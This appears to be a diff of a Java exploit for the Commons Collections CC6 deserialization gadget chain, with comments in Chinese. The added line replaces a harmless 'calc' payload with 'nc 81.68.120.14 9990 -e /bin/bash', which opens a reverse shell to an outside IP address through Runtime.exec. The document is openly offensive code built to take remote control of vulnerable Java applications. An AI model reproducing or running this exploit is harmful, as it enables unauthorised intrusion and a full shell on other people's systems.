@@ -13,11 +13,12 @@ import java.util.Map;
 // CC6 链最终 EXP
 public class FinalCC6EXP {
     public static void main(String[] args) throws Exception{
+        String[] cmd = {"nc 81.68.120.14 9990 -e /bin/bash"};
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+                new InvokerTransformer("exec", new Class[]{String.class}, cmd)
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
         HashMap<Object, Object> hashMap = new HashMap<>();
